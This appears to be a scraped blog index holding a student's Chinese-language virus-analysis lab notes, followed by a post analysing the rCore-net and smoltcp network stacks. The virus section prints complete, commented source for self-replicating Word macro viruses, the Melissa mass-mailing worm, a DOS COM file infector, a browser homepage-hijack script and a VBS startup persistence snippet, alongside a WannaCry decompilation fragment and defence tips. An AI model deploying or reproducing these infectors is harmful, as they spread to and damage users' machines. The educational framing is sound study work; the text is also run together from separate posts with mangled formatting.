*))LookupPrivilegeValueA_Addr)(0, aSetcbprivilege, &amp;lpLuid) )// 获得LUID &#123; local_unwind2((int)&amp;ms_exc.registration, -1); return -1; &#125; NewState = 1; lpLuid_1 = lpLuid; v18 = v27; v19 = 2; if ( !((int (__stdcall *)(void *, _DWORD, int *, signed int, int *, char *))AdjustTokenPrivileges_Addr)( TokenHandle, 0, &amp;NewState, 0x10, &amp;PreviousState, &amp;ReturnLength) ) // 提升当前权限 &#123; * if ( !((int (__stdcall *)(int, void ))WTSQueryUserToken_Addr)(SessionId, &amp;phToken) )// 获取用户的访问令牌 &#123; local_unwind2((int)&amp;ms_exc.registration, -1); return -1; &#125; if ( !((int (__stdcall *)(void *, signed int, _DWORD, signed int, signed int, void ))DuplicateTokenEx_Addr)(// 创建一个新的访问令牌 该文件的主要作用是提权，主要逻辑如下： 获取必要API函数地址 提上当前的权限 获取当前用户的访问令牌并创建一个新的访问令牌 最后再次提升权限 9 WannaCry 病毒分析总结该病毒涉及的相关文件及作用如下： msg 病毒的语言包 c.wnry 存储了比特币账户 一个下载链接 跟勒索相关 t.wnry 隐藏了一个dll文件 dll的导出函数是病毒的核心代码 u.wnry 解密器 r.wrny 勒索文档 @WanaDecryptor@.exe 解密器 taskse.exe 提权 taskdl.exe 删除临时文件和回收站的.WNCRY文件 00000000.pky 公钥 00000000.eky 被加密的私钥 00000000.res 八个字节的随机数和当前时间 .bat为解密器创建快捷方式 附上病毒行为的总结图表： 10 病毒预防及杀毒方案： 该病毒利用了永恒之蓝的漏洞，微软官方提供了相应的补丁文件，用户可以通过尽快安全更新的方式防止受到针对此漏洞的病毒的攻击 经过我们分析得知，该病毒的传播主要是利用了 445 端口发送病毒本体，关闭端口可以防止我们被攻击。 在分析病毒 exe 文件时，病毒加密器在 加密前会进行互斥体检测。检测是否已经有加密器程序存在，这是创建了互斥体 MsWinZonesCacheCounterMutexA ，安全软件可以预先创建互斥体，这样加密器在加密前就会自动推出，不会进行加密 11 学习笔记：微软 宏病毒病毒主体 basic123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&#39; Micro-VirusSub Document_Open()On Error Resume NextApplication. DisplayStatusBar&#x3D;False &#39;屏蔽状态栏Options. SaveNormalPrompt&#x3D;False&#39;修改公用模板时在后台自动保存，不给任何提示Ourcode &#x3D;ThisDocument. VBProject. VBComponents(1). CodeModule.Lines(1,100)&#39;获取当前文档代码对象Set Host &#x3D;NormalTemplate. VBProject. VBComponents(1). CodeModule&#39;获取共用模板的代码对象If ThisDocument &#x3D;NormalTemplate Then&#39;判断当前文件是否等于公用模板对象Set Host&#x3D;ActiveDocument. VBPro ject. VBComponents(1). CodeModule&#39;如果是，则获取当前活动文档的代码对象End IfWith HostIf. Lines(1.1)&lt;&gt;&quot;Micro-Virus&quot;Then &#39;判断当前文档是否感染病毒. Deletelines 1,. CountOfLines &#39;如果不是，就清除原来的代码. Insertlines 1, Ourcode&#39;嵌入病毒代码. Replaceline 2,&quot;Sub Document_Close()&quot;&#39;更换If ThisDocument&#x3D;nomaltemplate Then &#39;判断当前的文档是否是公用模块. ReplaceLine 2,&quot;Sub Document_Open()&quot;ActiveDocument. SaveAs ActiveDocument. FullNameEnd IfEnd IfEnd WithMsgBox &quot;MicroVirus by Content Security Lab&quot;End Sub 病毒分析2.4该代码的基本执行流程如下：1）进行必要的自我保护。高明的病毒编写者其自我保护将做得非常好，可以使word的一些工具栏失效，例如将工具菜单中的宏选项屏蔽，也可以修改注册表达到很好的隐藏效果。本例中只是屏蔽状态栏，以免显示宏的运行状态，并且修改公用模板时自动保存，不给用户提示。 basic1Application.DisplayStatusBar&#x3D;False Options.SaveNormalPrompt&#x3D;False 2）得到当前文档的代码对象和公用模板的代码对象。 2）得到当前文档的代码对象和公用模板的代码对象。 basic123456789Ourcode&#x3D;ThisDocument.VBProject.VBComponents（1）.CodeModule.Lines（1，100）Set Host&#x3D;NormalTemplate.VBPro ject.VBComponents（1）.CodeModuleIf ThisDocument &#x3D;NormalTemplate ThenSet Host&#x3D;ActiveDocument.VBProject.VBComponents（1）.CodeModuleEnd If 3）检查模板是否已经感染病毒，如果没有，则复制宏病毒代码到模板，并且修改函数名。 basic123456789101112131415161718192021With HostIf.Lines（1.1）&lt;）&quot;&quot;Micro-Virus&quot;Then.Deletelines 1，.CountOfLines.InsertLines 1，Ourcode.ReplaceLine 2，&quot;Sub Document_Close（）&quot;If ThisDocument&#x3D;nomaltemplate Then.ReplaceLine 2，&quot;Sub Document_open（）&quot;ActiveDocument.SaveAs ActiveDocument.Ful1NameEnd IfEnd IfEnd With 4）执行恶意代码。 basic1MsgBox&quot;MicroVirus by Content Security Lab&quot; 2.5此时当前word文档就含有宏病毒，只要下次打开这个word文档，就会执行以上代码，并将自身复制到Normal.dot（word文档的公共模板）和当前文档的ThisDocument中，同时改变函数名（模板中为DocumentClose，当前文档为DocumentOpen），此时所有的word文档打开和关闭时，都将运行以上的病毒代码，可以加入适当的恶意代码，影响word的正常使用，本例中只是简单的跳出一个提示框。将当前文档关闭再重新打开，弹出一个提示框，且屏蔽了状态栏 宏病毒分析2找到一个类似于给出病毒的实现并进行分析 basic123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271&#39;moonlightDim nm(4)Sub Smallboy_Virus()&#39;屏蔽状态栏，以免显示宏病毒执行状态；修改公用模版是自动保存且不提示；自动执行病毒模板On Error Resume NextApplication.DisplayStatusBar &#x3D; False&#39;屏蔽状态栏Options.SaveNormalPrompt &#x3D; False&#39;修改公用模板时在后台自动保存，不给任何提示Ourcode &#x3D; ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1,100)&#39;获取当前文档代码对象Set host &#x3D; NormalTemplate.VBProject.VBComponents(1).CodeModule&#39;获取共用模板的代码对象&#39;&#39;获取当前文档对象代码和共用模板对象代码If ThisDocument &#x3D; NormalTemplate Then&#39;判断当前文件是否等于公用模板对象Set host &#x3D; ActiveDocument.VBProject.VBComponents(1).CodeModule&#39;如果是，则获取当前活动文档的代码对象End If&#39;&#39;设立检查当前文档是否被感染，如果没有就自动执行复制宏病毒到模板并修改函数名操作With hostIf .Lines(1.1) &lt;&gt; &quot;Smallboy_Virus()&quot; Then&#39;判断当前文档是否感染病毒.deletelines 1, .countoflines&#39;如果不是，就清除原来的代码.insertlines 1, .OurcodeLines&#39;嵌入病毒代码.replaceline 2, &quot;Sub Smallboy_Virus()&quot;&#39;更换 Smallboy_VirusIf ThisDocument &#x3D; NormalTemplate Then&#39;判断当前的文档是否等于公用模块.replaceline 2, &quot;Sub Smallboy_Virus()&quot;&#39;如果是，则替换为 Smallboy_VirusActiveDocument.SaveAs ActiveDpcument.FullName&#39;保存文档，并修改函数名（）End IfEnd IfEnd With&#39;*弹出第一个框*MsgBox &quot;！！！&quot;&#39;*定义算数数据成员*Count &#x3D; 0 &#39;定义count&#x3D;0try: &#39;执行try语句On Error GoTo 0On Error GoTo trytest &#x3D; -1 &#39;初始化并定义text&#x3D;-1con &#x3D; 1 &#39;初始化并定义con&#x3D;1tog$ &#x3D; &quot;&quot; &#39;初始化tog$i &#x3D; 0 &#39;初始化并定义i&#x3D;0&#39;开始执行算术数据成员的行循环语句While test &#x3D; -1&#39;因为之前已经定义了test&#x3D;-1，所以肯定会先执行一次while循环For i &#x3D; 0 To 4&#39;执行一个for循环nm(i) &#x3D; Int(Rnd() * 100)&#39;将rnd（）*100的正整数结果赋值给数组nm（i）con &#x3D; con * nm(i)&#39;将con*nm(i)的值传回给conIf i &#x3D; 4 Then&#39;如果i&#x3D;4,也就是for循环结束之后，开始执行if下的语句tog$ &#x3D; tog$ + Str$(nm(4)) + &quot;&#x3D;?&quot;&#39;将tog$和Str$( nm(4))+字符串&quot;&#x3D;？&quot;的值都传给tog$GoTo beg &#39;执行beg语句End If &#39;上一个if判断语句执行结束tog$ &#x3D; tog$ + Str$(nm(i)) + &quot;*&quot;&#39;将tog$和Str$( nm(4))+字符串&quot;*&quot;的值都传给tog$Next i &#39;返回for循环beg:&#39;显示第二个对话框，进行答题判断Beepans$ &#x3D; InputBox(&quot;今天是&quot; + Date$ + &quot;，我们玩个心算游戏可好？&quot; +Chr$(13) + &quot;如果你答错了，我将代表月亮消灭你！&quot; + Chr$(13) + tog$, &quot;Smallboy&quot;)&#39;显示心算题，和输入心算结果&#39;*输入运算结果后将要执行的语句&#39;If RTrim$(LTrim$(ans$)) &#x3D; LTrim$(Str$(con)) Then&#39;判断ans$与con是否相等，这是是主要的if判断语句，是下面进行操作的主要依据&#39;输入答案正确后将要执行的语句&#39;*MsgBox &quot;恭喜你答对了！！！&quot;&#39;设置文本格式，字体&#39;Documents.AddSelection.Paragraphs.Alignment &#x3D; wdAlignParagraphCenter&#39; 设置居中对齐BeepWith Selection.Font&#39;设置文本字体.Name &#x3D; &quot;黑体&quot;&#39;设置文本字体为黑体.Size &#x3D; 16&#39;设置文本字体大小为16.Bold &#x3D; 1&#39;设置文本字体为粗体.Underline &#x3D; 1&#39;设置文本字体为下划线.Color &#x3D; wdColorRose&#39;设置文本字体问玫瑰红色End WithSelection.InsertAfter Text &#x3D; &quot;什么是宏病毒？&quot; &#39;嵌入文本Selection.InsertParagraphAfter &#39;换行BeepSelection.InsertAfter Text:&#x3D;&quot;答案：&quot; &#39;嵌入文本Selection.Font.Italic &#x3D; 1 &#39;设置文本字体为斜体Selection.InsertAfter Text:&#x3D;&quot;我就是&quot; &#39;嵌入文本Selection.InsertParagraphAfter &#39;换行Selection.InsertParagraphAfter &#39;换行Selection.Font.Italic &#x3D; 0 &#39;撤销文本为斜体BeepSelection.InsertAfter Text:&#x3D;&quot;如何防御宏病毒&quot; &#39;嵌入文本Selection.InsertParagraphAfter &#39;换行Selection.InsertParagraphAfter &#39;换行BeepSelection.InsertAfter Text:&#x3D;&quot;答案：&quot; &#39;嵌入文本Selection.Font.Italic &#x3D; 1 &#39;设置文本字体为斜体Selection.InsertAfter Text:&#x3D;&quot;别看我&quot; &#39;嵌入文本MsgBox &quot;按确定键，我将告诉你一个秘密......&quot;, &quot;好吧，告诉你吧！&quot;GoTo out &#39;退出goto语句&#39;输入答案不正确后将要执行的语句Else &#39;执行else语句，也就是回答错误后将要执行的Count &#x3D; Count + 1 &#39;count++，本来count初始化为0For j &#x3D; 1 To 20 &#39;执行循环语句，循环20次BeepDocuments.Add &#39;增加一个现在这个文档Next jSelection.Paragraphs.Alignment &#x3D; wdAlignParagraphCenter&#39;设置文本格式为居中对齐Selection.InsertAfter Text:&#x3D;&quot;宏病毒&quot; &#39;嵌入一个文本If Count &#x3D; 2 Then GoTo out&#39;判断是否执行打开该文本操作够2个20次，如果够了就退出goto语句GoTo tryWordBasic.filedefault &#39;退出WordBasic文本End IfWend &#39;结束with语句out: &#39;退出End Sub &#39;退出Sub 学习了宏病毒的结构 和 去除宏病毒的方法 结构 屏蔽状态栏，以免显示宏病毒执行状态；修改公用模版是自动保存且不提示；自动执行病毒模板 判断是否是 公用模板 ，否则复制到共用模板 通过首行内容判断是否感染病毒 执行病毒主体 利用多开窗口等方式耗尽系统资源以影响使用 COM病毒实验 COM文件的特点 COM文件是DOS的一种二进制代码的可执行文件，COM文件结构比较简单，加载过程十分迅速。整个程序只有一个段。因此全部代码长度必须小于64K，其入口代码地址是CS:100H。DOS装入COM文件时，先在内存建立一个长度为100H的程序前缀段(PSP，由DOS建立，是DOS用户程序和命令行之间的接口)，然后将整个文件装载于PSP上端，不进行重定位操作，接着将四个段地址寄存器DS(DataSegment)，CS(Code Segment)，SS(Stack Segment)，ES(Extra Segment)初始化为程序前缀段(PSP)的段地址，最后将程序的控制权交于CS:100H处。如表一所示： 表1：COM病毒的装入和执行 病毒原理 COM病毒感染一般有两种途径，一种是将自身代码附加到宿主程序之前，病毒执行完后恢复寄生程序原先的状态，并用JMPFAR等指令使程序再次回到CS:100H处，以确保寄生程序与PSP的一致。但更为常见的病毒为采用保存文件头若干字节，并将第一条指令改为”JMP病毒入口”，以确保病毒最先执行。病毒执行完后，会恢复并运行原文件，以便传播，当其将原文件参数全部恢复后，会将控制权交于CS:100H处。 带感染的COM文件12345678910111213141516171819proqram seqmentassume cs:program,ds:program,ss:program,es:programorg 0100h # 置程序的初值为100h，开始程序的运行MOV AX, SEG MESSAGE # 将 message 段地址赋给AX寄存器MOV DS, AX #MOV DX, offset message #将偏移量赋给 DXMOV AH, 09h #打印字符串INT 21hMOV AH, 4Ch # 终止程序 返回 DOSINT 21hRETmessage db&quot;This a simple com program for a test ???&quot;,0dh,0ah,&quot;$&quot;program endsEND 病毒的ASM文件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115CSEG SEGMENTASSUME CS:CSEG,DS:CSEG,SS:CSEGmain PROC NEARmainstart:CALL vstart ;病毒代码开始处vstart:POP SI #得到当前地址MOV BP,SI #保存当前地址PUSH SIMOV AH,9ADD SI,OFFSET message-OFFSET vstart #显示预设字符串MOV DX,SIINT 21hPOP SIADD SI,OFFSET yuan4byte-OFFSET vstart #取得原程序前四个字节MOV DI,100h #目的地址MOV AX,DS:[SI] #开始复制MOV DS:[DI],AXINC SIINC SIINC DIINC DIMOV AX,DS:[SI]MOV DS:[DI],AXMOV SI,BP #恢复地址值MOV DX,OFFSET delname-OFFSET vstart #得到删除文件名ADD DX,SIMOV AH,41hINT 21hMOV DX,OFFSET filename-OFFSET vstart#得到要感染文件名ADD DX,SIMOV AL,02MOV AH,3dhF#写文件INT 21hJC errorMOV BX,AX#文件句柄MOV DX,OFFSET yuan4byte-OFFSET vstart#读文件前四个字节ADD DX,SIMOV CX,4MOV AH,3fhINT 21hMOV AX,4202h#到文件尾XOR CX,CXXOR DX,DXINT 21hMOV DI,OFFSET new4byte-OFFSET vstart#保存要跳的地方ADD DI,2ADD DI,SISUB AX,4MOV DS:[DI],AXADD SI,OFFSET mainstart-OFFSET vstart#准备写入病毒MOV DX,SIMOV vsizes,OFFSET vends-OFFSET mainstartMOV CX,vsizesMOV AH,40hINT 21hMOV SI,BP#定位到文件头MOV AL,0XOR CX,CXXOR DX,DXMOV AH,42hINT 21hMOV AH,40h#将新的文件头写入MOV CX,4MOV DX,OFFSET new4byte-OFFSET vstartADD DX,SIINT 21hMOV AH,3eh#关闭文件INT 21herror:MOV AX,100hPUSH AXRETmain ENDPyuan4byte:RET ; ??DB 3 DUP (?)vsizes DW 0new4byte DB &#39;M&#39;,0e9h,0,0filename DB &quot;test.com&quot;,0delname DB &quot;del.txt&quot;,0message DB &quot;You are infected by a simple com virus~~&quot;DB 0dh,0ah,&quot;$&quot;vends:start:MOV AX,CSEGMOV DS,AXMOV SS,AXCALL mainMOV AX,4c00hINT 21hCSEG ENDSEND start 分析的有趣的点 DOS下com文件的加载时一对一的映射的，没有PE结构那样的MZ头和PE头 COM文件加载代码的基址是100H，0~100H是PSP结构，COM文件只有一个段，所以DS，ES……段寄存器都指向PSP COM文件没有堆栈段，用debug调试发现，sp：FFFE，bp：0000，bp寄存器经过测试可以用来存储其他的值对运行没有影响 病毒代码使用call pop组合拿到pop处代码的绝对地址，以实现重定位 通过对被感染文件的前4字节填充为 sub bp， jmp shellcode实现shellcode跳转，进入shellcode首先恢复前4字节，然后执行完流程后通过push 100H,ret返回原程序 在这里M除了躲避杀毒软件的查杀我没想到其他作用，删掉不影响运行（但是首地址的jmp的目标地址需要对应的修改） yuan4byte中ret的作用：让病毒程序返回Main函数，成功运行完整个流程 为什么要SUB AX,4：类似于inline-hook，jmp相对地址，需要减去jmp语句所在的偏移地址再-jmp本身的长度 梅丽莎病毒实验代码 basic123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215Sub autoOpen()On Error Resume Next&#39;*修改注册表，循环发送邮件程序部分If System.PrivateProfileString(&quot;&quot;,&quot;HKEY_CURRENT_USERSoftwareMicrosoftOffice11.0WordSecurity&quot;,&quot;Level&quot;) &lt;&gt; &quot;&quot; Then &#39;注册表项判断CommandBars(&quot;Macro&quot;).Controls(&quot;Security...&quot;).Enabled &#x3D; False&#39;宏工具栏安全选项失效System.PrivateProfileString(&quot;&quot;,&quot;HKEY_CURRENT_USERSoftwareMicrosoftOffice11.0WordSecurity&quot;,&quot;Level&quot;) &#x3D; 1&amp;ElseCommandBars(&quot;Tools&quot;).Controls(&quot;Macro&quot;).Enabled &#x3D; False&#39;工具菜单栏宏选项失效Options.ConfirmConversions &#x3D; (1-1): &#39;文件转换对话框不显示Options.VirusProtection &#x3D; (1-1): &#39;宏警告对话框不显示Options.SaveNormalPrompt &#x3D; (1-1) &#39;Normal.dot被修改后不显示对话框End IfDim UngaDasOutlook, DasMapiName, BreakUmOffASliceSet UngaDasOutlook &#x3D; CreateObject(&quot;Outlook.Application&quot;)&#39;创建outlook应用程序实例对象Set DasMapiName &#x3D; UngaDasOutlook.GetNameSpace(&quot;MAPI&quot;)&#39;获取MAPI对象If System.PrivateProfileString(&quot;&quot;,&quot;HKEY_CURRENT_USERSoftwareMicrosoftOffice&quot;, &quot;Melissa&quot;)&lt;&gt; &quot;... by Kwyjibo&quot; ThenIf UngaDasOutlook &#x3D; &quot;Outlook&quot; ThenDasMapiName.Logon &quot;profile&quot;, &quot;password&quot;For y &#x3D; 1 To DasMapiName.AddressLists.Count&#39;遍历地址簿，进行邮件发送操作Set AddyBook &#x3D; DasMapiName.AddressLists(y)x &#x3D; 1Set BreakUmOffASlice &#x3D; UngaDasOutlook.CreateItem(0)For oo &#x3D; 1 To AddyBook.AddressEntries.CountPeep &#x3D; AddyBook.AddressEntries(x)&#39;获取第 x 个收件人的收件地址BreakUmOffASlice.Recipients.Add Peep&#39;加入收件人的地址x &#x3D; x + 1If x &gt; 50 Then oo &#x3D; AddyBook.AddressEntries.CountNext ooBreakUmOffASlice.Subject&#x3D; &quot;Important Message From &quot; &amp;Application.UserName &#39;设置邮件的主题BreakUmOffASlice.Body &#x3D; &quot;Here is that document you asked for ...don&#39;t show anyone else ;-)&quot; &#39;设置邮件的内容BreakUmOffASlice.Attachments.Add ActiveDocument.FullName &#39;加入附件BreakUmOffASlice.Send &#39;发送邮件Peep &#x3D; &quot;&quot;Next yDasMapiName.Logoff &#39;断开连接End IfSystem.PrivateProfileString(&quot;&quot;,&quot;HKEY_CURRENT_USERSoftwareMicrosoftOffice&quot;,&quot;Melissa?&quot;) &#x3D; &quot;... by Kwyjibo&quot; &#39; 设置感染标志End If&#39;*FirstPartSet ADI1 &#x3D; ActiveDocument.VBProject.VBComponents.Item(1)&#39;获取当前文档VBA工程第一个模块的名称Set NTI1 &#x3D; NormalTemplate.VBProject.VBComponents.Item(1)&#39;获取Normal.dot VBA工程第一个模块的名称NTCL &#x3D; NTI1.CodeModule.CountOfLinesADCL &#x3D; ADI1.CodeModule.CountOfLinesBGN &#x3D; 2If ADI1.Name &lt;&gt; &quot;Melissa&quot; Then &#39;如果当前文档为感染If ADCL &gt; 0 Then ADI1.CodeModule.DeleteLines 1, ADCLSet ToInfect &#x3D; ADI1ADI1.Name &#x3D; &quot;Melissa&quot;DoAD &#x3D; TrueEnd IfIf NTI1.Name &lt;&gt; &quot;Melissa&quot; Then&#39;如果 Normal.dot 未感染If NTCL &gt; 0 Then NTI1.CodeModule.DeleteLines 1, NTCLSet ToInfect &#x3D; NTI1NTI1.Name &#x3D; &quot;Melissa&quot; &#39;修改VBA工程第一个模块为 MellisaDoNT &#x3D; TrueEnd IfIf DoNT &lt;&gt; True And DoAD &lt;&gt; True Then GoTo CYA&#39;开始感染 Normal.dotIf DoNT &#x3D; True ThenDo While ADI1.CodeModule.Lines(1, 1) &#x3D; &quot;&quot;ADI1.CodeModule.DeleteLines 1LoopToInfect.CodeModule.AddFromString (&quot;Private Sub Document_Close()&quot;)Do While ADI1.CodeModule.Lines(BGN, 1) &lt;&gt; &quot;&quot;ToInfect.CodeModule.InsertLines BGN, ADI1.CodeModule.Lines(BGN, 1)BGN &#x3D; BGN + 1LoopEnd IfIf DoAD &#x3D; True Then &#39;开始感染当前文档Do While NTI1.CodeModule.Lines(1, 1) &#x3D; &quot;&quot;NTI1.CodeModule.DeleteLines 1LoopToInfect.CodeModule.AddFromString (&quot;Private Sub Document_Open()&quot;)Do While NTI1.CodeModule.Lines(BGN, 1) &lt;&gt; &quot;&quot;ToInfect.CodeModule.InsertLines BGN, NTI1.CodeModule.Lines(BGN, 1)BGN &#x3D; BGN + 1LoopEnd IfCYA:&#39;保存被修改的当前文档和Normal.dotIf NTCL &lt;&gt; 0 And ADCL &#x3D; 0 And (InStr(1, ActiveDocument.Name,&quot;Document&quot;) &#x3D; False) ThenActiveDocument.SaveAs FileName:&#x3D;ActiveDocument.FullNameElseIf (InStr(1, ActiveDocument.Name, &quot;Document&quot;) &lt;&gt; False) ThenActiveDocument.Saved &#x3D; TrueEnd If&#39;WORD&#x2F;Melissa written by Kwyjibo&#39;Works in both Word 2000 and Word 97&#39;Worm? Macro Virus? Word 97 Virus? Word 2000 Virus? You Decide!&#39;Word -&gt; Email | Word 97 &lt;--&gt; Word 2000 ... it&#39;s a new age!If Day(Now) &#x3D; Minute(Now) ThenSelection.TypeText &quot; Twenty-two points, plus triple-word-score, plusfifty points for using all my letters. Game&#39;s over. I&#39;m outtahere.&quot;End Sub 修改注册表 发送邮件 HTML病毒无限跳窗口病毒 12345&lt;body&gt;&lt;A href=&quot;&quot; onmouseover=&quot;while(true)&#123;window.open()&#125;&quot;&gt;恶意弹出窗口！&lt;/A&gt; &lt;/body&gt; 将此病毒运行在现实中的 chrome 浏览器上，系统提示阻止弹出窗口，表明现行的浏览器已经对这种病毒进行了防护 更改主页病毒通过 VbScript 嵌入 html 的 script 标签， 嵌入一段vb代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;html&gt;&lt;META http-equiv=Content-Type content=&quot;text/html:charset=gb2312&quot;&gt;&lt;HEAD&gt;&lt;SCRIPT language=&quot;vbscript&quot;&gt;Sub main()Dim TheFormSet TheForm=Document.forms（&quot;myform&quot;）strKey=&quot;HKEY_CURRENT_USERSoftwarellicrosoftInternetExplorerMain&quot;strValue=&quot;Start Page&quot;strData=&quot;http://www.simpleware.com.cn&quot;strType =&quot;REG_SZ&quot;regAdd strKey，strValue，strData，strTypeEnd Sub&lt;!--上方 main script主体，调用regAdd 函数 进行注册表项的更改--&gt;function regAdd（strKey，strValue，strData，strType）Dim WshshellSet WshShell=CreateObject（&quot;WScript.Shell&quot;）WshShell.RegWrite strKey &amp; &quot;&quot; &amp; strValue,strData,strType&lt;!通过 shell 文件进行注册表项的改写&gt;msgbox（&quot;Successful&quot;）&lt;!改写成功后 显示 successful&gt;end function&lt;/SCRIPT&gt; &lt;/HEAD&gt;&lt;body onload=&quot;main()&quot;&gt;修改主页&lt;/body&gt;&lt;/html&gt; 注册表修改成功 五、防治方法：5.1要避免被网页恶意代码感染，首先关键是不要轻易去一些并不信任的站点。5.2IE点击”工具–&gt;Internet选项–&gt;安全–&gt;Internet区域的安全级别”，把安全级别由”中”改为”高”。5.3具体方案是：在IE窗口中点击”工具—&gt;Internet选项”，在弹出的对话框中选择”安全”标签，再点击”自定义级别”按钮，就会弹出”安全设置”对话框，把其中所有ActiveX插件和控件以及与Java相关全部选项选择”禁用”。5.4一定要在计算机上安装防火墙，并要时刻打开”实时监控功能”。5.5在注册表的KEYCURRENTUSERSoftwareMicrosoftWindwsCurrentVersionPoliciesSystem下，增加名为DisableRegistryTools的DWORD值项，将其值改为”1”，即可禁止使用注册表编辑器命令regedit.exe。5.6因为特殊原因需要修改注册表，可应用如下解锁方法：开始因为特殊原因需要修改注册表，可应用如下解锁方法：运行—&gt;gpedit.msc打开组策略左面分级展开用户配置—&gt;管理模板—–&gt;系统右面有个阻止访问注册表编辑工具设置成已禁用确定即可。5.7随时升级IE浏览器的补丁。【实验思考】1.可根据”几个相关修改”中提到的注册表中值，利用”更改主页”中修改注册表的方法，来进行自己的注册表修改，并给出如何防范和修复。 脚本病毒自动拷贝到开始菜单启动栏项 On Error Resume Next’启动或关闭一个错误处理常式 Setfs=CreateObject(“Scripting.FileSystemobject”)’创建并返回一个对Activex对象的引用 Set diro=fs.GetSpecialFolder(0)’取系统路径C:windows dirl=Mid(dir0,1,InStr(dir0,”:”))’取系统盘符 Set so=CreateObject（”Scripting.FileSystemObject”） dim r’定义变量 Set r=Create0bject(“Wscript.Shel1”)’创建并返回一个对Activex对象的引用 so.GetFile(WScript.ScriptFullName).Copy(dirl&amp;”Documents andSettingsAdministrator[开始]菜单程序启动Win32system.vbs”) ‘拷贝文件 病毒分析文件监控 学会了Process Monitor 的使用，这个软件现在仍然活跃在今日的舞台 1.8注意，不要把explorer.exe和iexplore.exe这两个进程过滤掉，因为病毒经常要注入代码到这两个进程中完成特别的功能。如果过滤掉这两个进程，那么就无法监控到被注入到这两个进程的代码所进行的文件操作。 注册表监控 ： 根据 operation 过滤项，查看 RegSetValue即更改了注册表项的进程 进程监控二 ： 学会使用 Process Explorer 网络监控：利用 TcpView 工具进行 端口，进程的网络连接监控，netspy进行侵入并打开7306端口等待 netmonitor 的监控，可以查看计算机中的文件 全面监控： 利用 InCtrl5 对安装程序的安装过程进行文件，注册表项，INI，TXT文件的全面跟踪，从而实现对安装过程的全面了解，并生成一份报告，供查阅 致 谢感谢老师 和 学长的帮助和指导","link":"","tags":[{"name":"network","slug":"network","permalink":"https://dingiso.github.io/tags/network/"},{"name":"virus","slug":"virus","permalink":"https://dingiso.github.io/tags/virus/"}]},{"title":"rCore-net 及 smoltcp 分析","date":"2020-09-30T00:05:34.000Z","path":"2020/09/30/Analysis of rCore-Net/","text":"本文是 rCore-Net 项目前对于 rCore-net 和 smoltcp 的分析 rCore-Net 分析rCore-Net 主要借用 smoltcp 的crate ，主要完成了，TCP，UDP，RAW，PACKET（作为以太网出口），Netlink 等结构和相关功能。 总体结构：SOCKETS ：smoltcp是单线程的网络协议栈，定义一个全局的互斥锁，以保证操作的互斥性 四种 SocketStateTCP：利用TCP协议的方式， UDP：利用UDp协议的方式 Raw：可用于接受其他协议的数据 Packet：没有状态，只用于以太网出口 Netlink：基于socket的通信机制实现的内核空间和用户空间的销量数据的及时交互 SocketState 的 imp 函数们read ： 从 buffer 中取出尽可能多的数据，放到一个 u8数组，（data） 中 write ： Tcp 发送到连接的远程 endpoint Udp 发送到参数指定的远程 endpoint Raw 如果头部包含在考虑范围则可以直接发送，否则自己组一个 ip packet包，发送到指定远程 endpoint(通过将远程地址填入头部 destination处) poll ： 检查socket状态 ， 返回（是否正常，是否能接收，是否能发送） connect ： 与远程 endpoint 连接 ，通过设置remote_endpoint, Tcp需要分配一个临时的 port 。 bind ： 将 socket 绑定一个本地的 ip listen ： 如果没有listen对应的端口，就开启listen，否则不操作 shutdown : 关闭socket accept ： Tcp 从连接事件队列中取出一个时间，建立新的socket 并替换当前的socket local_endpoint : 返回本地ip remote_endpoint : 返回远程 ip box_clone : clone一个自身对象 ioctl ： TODO 函数的普遍过程普遍函数调用过程 ，获取 SOCKETS 的互斥锁， 并获取他的句柄，转类型为 TcpSocket 或 UcpSocket 进行对 socket 的操作，然后及时将锁和句柄drop 掉 TODO： ioctl 和 ArpSeq 的部分 可能还需要再研究一下 Smoltcp 分析TCPTcp State : [enum] 由 rfc 793 规定的 11 种状态 Timer : [enum] 由timer 触发的重传，快速重传等行为 set_for_idle() 设定活跃时间为 当前时间戳 timestamp + 设定的时间间隔 interval should_keep_alive() 判断当前时间戳是否 &gt;= 活跃时间 should_retransmit() 时间戳大于重传期限则重传，返回 超时时间+延迟 快速重传 返回 0 set_keep_alive() 初始化 活跃时间为 0 should_close() 时间戳大于关闭期限 返回 true poll_at 返回 socket 下一次被 poll 的时间 TcpSocket struct 主要包括一下内容 两个buffer 存储 接受的内容和要发送的内容 state ：保存socket 的状态 timer ：用于计时 assembler ：缓冲区的 重新组装 addr 及 endpoint : 本地ip及接口和 远程的 ip 及 接口 seq_no : Tcp中的 sequence number ack ： ack码 win ： Tcp 的发送窗口相关内容 listen : 开始监听本机相应端口，open会返回 illegal ， 端口为0 则返回 unaddressable connect : 跟远程endpoint连接，端口期望给出，否则分配一个 49152-65535 端口 close ：关闭全双工连接的传输部分 问题： TcpSocketState的 write函数， 第二个参数 _send_to_endpoint 并没有使用， 提了 issue [Bug Report] wrong of fn write in the TcpSocketState 好吧，我傻了，此参数只是用来填充以保证 trait 的实现的。（菜） smoltcp - storage/ring_buffer.rs 255行 dequeue_slice 函数为什么计算两次size","link":"","tags":[{"name":"rCore","slug":"rCore","permalink":"https://dingiso.github.io/tags/rCore/"},{"name":"risc-v","slug":"risc-v","permalink":"https://dingiso.github.io/tags/risc-v/"},{"name":"os","slug":"os","permalink":"https://dingiso.github.io/tags/os/"},{"name":"network","slug":"network","permalink":"https://dingiso.github.io/tags/network/"}]},{"title":"操作系统期末总结","date":"2020-08-27T09:05:05.000Z","path":"2020/08/27/操作系统 